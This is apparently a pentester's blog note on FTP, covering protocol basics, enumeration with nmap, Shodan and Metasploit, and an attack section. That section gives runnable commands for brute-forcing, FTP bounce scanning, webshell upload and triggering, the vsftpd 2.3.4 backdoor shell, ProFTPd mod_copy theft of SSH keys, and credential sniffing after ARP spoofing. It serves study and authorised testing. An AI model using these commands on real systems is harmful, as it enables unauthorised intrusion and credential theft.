---
author: Kayra
pubDatetime: 2025-01-31T16:10:24Z
modDatetime: 2026-06-03T00:00:00Z
title: "FTP"
slug: ftp
featured: false
draft: false
tags:
  - security
  - notes
description: "What FTP is, how to enumerate it (vsFTPd config, anonymous access, server interrogation), and the attacks: brute-forcing, known-version exploits, the FTP bounce SSRF, web-app command injection, and credential sniffing."
---

## Introduction

FTP transfers files over TCP using two separate connections: a control connection on port 21 for commands, and a data connection for the file transfer itself.

- **Active mode**: the *server* opens the data connection back to the client, from port 20. This breaks when the client is behind a firewall or NAT, since the inbound connection gets dropped.
- **Passive mode**: the *client* opens both connections, to a port the server nominates. This is what works through firewalls, and it is the reason for flags like `--no-passive` that force the mode.

FTP is clear-text by default, so credentials and file contents can be sniffed off the wire. But the TLS variant FTPS does exist (`AUTH TLS`, advertised in the server's `FEAT` output), so "clear-text" is not universal, and you may need to connect over TLS to talk to the server at all. TFTP is a stripped-down cousin over UDP with no authentication. On Linux the most common server is vsFTPd, configured in `/etc/vsftpd.conf`.

## Enumeration

Run nmap's FTP scripts first, then connect and look around. Anonymous access is the quickest win, so check for it. Note the server and version from the banner too: it is the lead for the version-specific exploits below. Once you are connected, `HELP`, `FEAT`, and `STAT` interrogate the server itself: `HELP` lists supported commands, `FEAT` advertises features (this is where you spot `AUTH TLS`), and `STAT` reports version, config, and session state. On an external engagement you can find exposed FTP without touching the target at all: Shodan already indexes it, so scoping a query to the target's IP range, org, or domain (`port:21 net:203.0.113.0/24`) lists their exposed servers without sending a single packet to them. Keep it scoped: a bare `port:21` returns every FTP server on the internet, not the client's.

```bash
# Footprint FTP with nmap's FTP scripts
nmap -sV -p 21 --script "ftp-*" 10.10.10.10

# Grab the banner and version (the lead for known CVEs)
nc 10.10.10.10 21

# Connect to the server
ftp 10.10.10.10

# Just the TLS handshake and cert on an FTPS server (AUTH TLS, if FEAT advertises it)
openssl s_client -starttls ftp -connect 10.10.10.10:21

# Actually browse and download over FTPS (openssl only does the handshake)
lftp -e 'set ssl:verify-certificate no' -u user,password 10.10.10.10

# Inside the client: interrogate the server, then list and transfer
HELP            # commands this server supports
FEAT            # advertised features (AUTH TLS, REST, MLSD...)
STAT            # server version, config, current session
debug           # print each protocol command and response (client-side debugging)
trace           # trace packet routing during a transfer
ls -aR          # list all files (including hidden), recursively
binary          # set binary mode BEFORE pulling executables (ascii corrupts them)
GET file.txt    # download a file from the server to your machine
PUT shell.php   # upload a file from your machine to the server

# Mirror an entire FTP server non-interactively
wget -m --no-passive ftp://user:password@10.10.10.10

# External recon: find the TARGET's exposed FTP without touching it
# scope to their netblock / org / domain, or you list the whole internet
shodan search 'port:21 net:203.0.113.0/24'   # the target's IP range
shodan search 'port:21 org:"Target Corp"'    # the target's org
shodan search 'port:21 hostname:target.com'  # the target's domain

# Metasploit modules for anonymous access and version (engagements, not the exam)
msfconsole -q -x 'use auxiliary/scanner/ftp/anonymous; set RHOSTS 10.10.10.10; run; exit'
msfconsole -q -x 'use auxiliary/scanner/ftp/ftp_version; set RHOSTS 10.10.10.10; run; exit'
```

These `vsftpd.conf` settings are the ones worth spotting, each one loosens access:

```bash
anonymous_enable=YES    # anonymous login allowed
anon_upload_enable=YES  # anonymous upload allowed
no_anon_password=YES    # anonymous login without a password
write_enable=YES        # allow STOR/DELE/MKD/RNFR (upload, delete, rename)
anon_root=/srv/ftp      # where anonymous lands (note if it's the web root)
local_enable=YES        # local system users can log in
hide_ids=YES            # listings show owner/group as "ftp"
```

> **Note:** vsFTPd is not the only server. ProFTPd reads `proftpd.conf`, and `/etc/ftpusers` is a denylist of accounts forbidden from logging in over FTP, so reading it doubles as a quick user enumeration.

## Attacks

- **Anonymous login**: many servers accept the `anonymous` user with any password, so it is always the first thing to try.
- **Brute-forcing**: with a known or guessed username, run a password list against the login. Spray one password across users to avoid lockouts (Medusa).
- **Known-version exploits**: the banner version usually maps to a public exploit. vsftpd 2.3.4 ships a backdoor (a username ending in `:)` opens a root shell on port 6200), ProFTPd's `mod_copy` copies files with no authentication via `SITE CPFR` / `CPTO` (stage a webshell or read SSH keys), and ancient wu-ftpd exposed command execution through `SITE EXEC`, and several servers carry path-traversal CVEs. Grab the version, then search for it.
- **FTP bounce (SSRF)**: the `PORT` command lets the client choose the address the server opens its data connection to, and old servers never check it. At the simple end that proxies a port scan of internal hosts you cannot reach. But by staging a file with `STOR` and combining `REST` + `PORT` + `RETR`, you can make the server send *arbitrary bytes* to a third host, speaking to other plaintext services (HTTP, another FTP). It is a full SSRF primitive, not just a scanner. This works because of how text protocols delimit commands. FTP, HTTP, and SMTP all use a CRLF (a carriage return plus a line feed, `\r\n` / `0x0d 0x0a`) as their end-of-line marker: the server reads bytes until it hits a CRLF, treats everything before it as one complete command, runs it, then starts on the next line. So a staged request has to terminate every line with a real CRLF, or the receiving service reads the whole payload as one malformed line and discards it. That same parsing rule is the lever in the next attack: slip a CRLF into data the server forwards and you end its current line early and inject a new command of your own.
- **Command injection via a web app**: when a web application forwards user-controlled input straight to an FTP server, you can smuggle FTP commands by injecting a CRLF. URL-encode the newline as `%0d%0a`, or double-encode it as `%250d%250a` when the value gets decoded twice, to make the server run commands of your choosing: pull content from a host you control, port-scan, or talk to another plaintext service.
- **Sniffing credentials**: FTP authentication is plaintext, so from a man-in-the-middle position on an internal engagement (sharing a broadcast domain with the client or server, then ARP-spoofing) a packet capture lifts the username and password straight off the wire. Wireshark's `ftp` display filter shows the `USER` / `PASS` exchange in clear.
- **From access to a shell**: FTP only moves files, so a shell comes from *where* they land. If the FTP directory is also the web root, upload a webshell and trigger it over HTTP for RCE. Otherwise the credentials are often reused, so try them on SSH.
- **FileZilla admin interface**: the FileZilla Server admin service on port 14147 often accepts a blank password. Tunnel to it and create your own FTP user with full filesystem access.
- **Looting**: once you can read the filesystem, download configs, source code, and backups, they routinely hold credentials and connection strings.

```bash
# Anonymous login: connect as "anonymous" with any or blank password
ftp anonymous@10.10.10.10
# or list anonymously in a single command
curl ftp://anonymous:anonymous@10.10.10.10/

# Brute-force logins with Medusa
medusa -u admin -P /usr/share/wordlists/rockyou.txt -h 10.10.10.10 -M ftp

# FTP bounce: scan an internal host through the FTP server
sudo nmap -Pn -v -n -p 80 -b anonymous:password@10.10.10.10 172.16.0.5

# If the FTP root is web-served: upload a webshell (inside the ftp session), then trigger it
put shell.php
curl "http://10.10.10.10/shell.php?c=id"

# Credentials are often reused: try them on SSH for a direct shell
ssh user@10.10.10.10

# Sniff plaintext FTP creds from a MITM position (after e.g. ARP spoofing)
tcpdump -i eth0 -A 'tcp port 21' | grep -iE 'USER|PASS'

# vsftpd 2.3.4 backdoor: log in with any username ending in :) then connect to the root shell
nc 10.10.10.10 6200

# ProFTPd mod_copy: copy files with no auth (over the control connection)
SITE CPFR /home/user/.ssh/id_rsa
SITE CPTO /var/www/html/key.txt

# FileZilla admin (port 14147, often blank password): tunnel, then connect locally
ssh -L 14147:127.0.0.1:14147 user@10.10.10.10
```
